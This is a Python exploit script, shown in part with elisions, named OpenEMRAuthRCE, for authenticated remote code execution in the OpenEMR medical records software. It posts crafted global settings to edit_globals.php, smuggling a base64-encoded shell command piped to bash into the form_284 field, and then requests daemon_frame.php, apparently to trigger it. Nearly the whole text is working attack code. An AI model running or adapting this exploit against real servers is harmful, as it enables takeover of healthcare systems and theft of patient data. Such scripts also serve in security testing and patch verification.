...
class OpenEMRAuthRCE:
    ...
    def exploit(self):
        ...
        pay_data = {}
        for i in payload.replace("&", "\n").splitlines():
            p = i.split("=")
            pay_data.update({p[0]: p[1]})
        
        cmd = "|| echo " + str(base64.b64encode(self.cmd.encode())) + "|base64 -d|bash"
        pay_data.update({"form_284" : cmd})
        
        print (LogColors.YELLOW + "payload:" + LogColors.ENDC)
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        
        r = self.session.post(
            self.url + "/interface/super/edit_globals.php", 
            data = pay_data, headers = self.headers
        )
        r = self.session.get(self.url + "/interface/main/daemon_frame.php")
        if r.ok:
...
if __name__ == '__main__':
    ...
    cve = OpenEMRAuthRCE(url, user, pswd, cmd)
    cve.exploit()
